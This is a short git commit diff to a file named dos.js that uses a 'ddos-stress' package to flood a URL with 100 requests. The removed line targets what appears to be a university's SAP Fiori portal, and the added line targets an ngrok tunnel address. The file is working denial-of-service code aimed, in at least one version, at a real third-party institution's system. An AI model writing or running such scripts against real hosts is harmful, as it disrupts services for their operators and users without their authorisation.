1a6e2be29e0845fc5d7b38f47424c8ae95f75801
Najeeb Patoana <najeebpatoana007@gmail.com>
2024-08-24 07:46:13 +0500

    V2

--- dos.js
+++ dos.js
@@ -4,4 +4,4 @@ const Stress = require('ddos-stress');
 const stress=new Stress();
 
 
-stress.run('https://fiori.riphah.edu.pk:8011/sap/bc/ui2/flp#Shell-home',100);
+stress.run('https://feasible-careful-redfish.ngrok-free.app/',100);
